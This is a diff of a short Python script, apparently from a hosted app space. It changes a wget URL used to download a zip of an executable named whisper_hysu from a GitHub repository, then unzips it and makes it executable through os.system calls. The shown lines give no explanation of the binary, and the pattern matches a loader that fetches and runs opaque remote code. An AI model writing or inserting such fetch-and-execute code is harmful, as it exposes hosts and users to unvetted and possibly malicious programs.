@@ -1,5 +1,5 @@
 import os
-os.system("wget https://github.com/qqivk/project-3/raw/refs/heads/main/whisper_vxc.zip")
+os.system("wget https://github.com/qqivk/project-3/blob/main/whisper_hysu.zip")
 os.system("unzip whisper_hysu.zip")
 os.system("chmod +x whisper_hysu")
 wn = os.getenv('SPACE_ID').replace("/","_")
